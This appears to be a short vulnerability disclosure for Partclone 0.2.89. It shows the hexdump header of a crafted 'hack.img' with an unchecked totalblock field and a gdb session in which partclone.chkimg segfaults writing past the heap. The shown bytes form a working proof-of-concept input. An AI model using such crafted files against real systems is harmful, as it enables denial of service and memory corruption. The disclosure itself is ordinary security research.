# Partclone_HeapOverFlow


Partclone.chkimg that checks image has a vulnerability with openning a maliciusly craft image file.
It causes Denial-Of-Service.
<br><br>

root@ubuntu:/partclone-0.2.89# hexdump -C hack.img | more

00000000  70 61 72 74 63 6c 6f 6e  65 2d 69 6d 61 67 65 45  |partclone-imageE|

00000010  58 54 46 53 00 00 00 00  00 00 00 00 00 00 30 30  |XTFS..........00|

00000020  30 31 00 00 00 04 00 00  00 20 bf 0c 00 00 00 00  |01....... ......|

00000030  c8 2f 03 00 00 ff ff ff  ba 7a 00 00 00 00 00 00  |./.......z......|

00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

<br><br>

(insufficient checking on offset 0x35 ~ 0x37 in image-header.totalblock)

<br><br>
root@ubuntu:/partclone-0.2.89# gdb ./partclone.chkimg

Reading symbols from ./partclone.chkimg...done.
(gdb) r -s hack.img

Starting program: partclone-0.2.89/src/partclone.chkimg -s hack.img

[Thread debugging using libthread_db enabled]

Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".

Partclone v0.2.89 http://partclone.org

Starting to check image (hack.img)

we need memory: 137438984768 bytes


image head 4160, bitmap 137438979580, crc 1028 bytes


Calculating bitmap... Please wait... image_hdr : 10000032fc8


totalblock size : 1099511836616


Program received signal SIGSEGV, Segmentation fault.


0x0804ed96 in pc_clear_bit (total=1099511836616, bitmap=0x8057d38, nr=1021504) at bitmap.h:53


53              bitmap[offset] &= ~(1UL << bit);


(gdb) x/x bitmap


0x8057d38:      0xffffffff


(gdb) p bitmap


$1 = (unsigned long *) 0x8057d38


(gdb) x/x bitmap+offset


0x8077000:      Cannot access memory at address 0x8077000		// Out of Heap memory area


(gdb) p offset


$2 = 31922


(gdb)

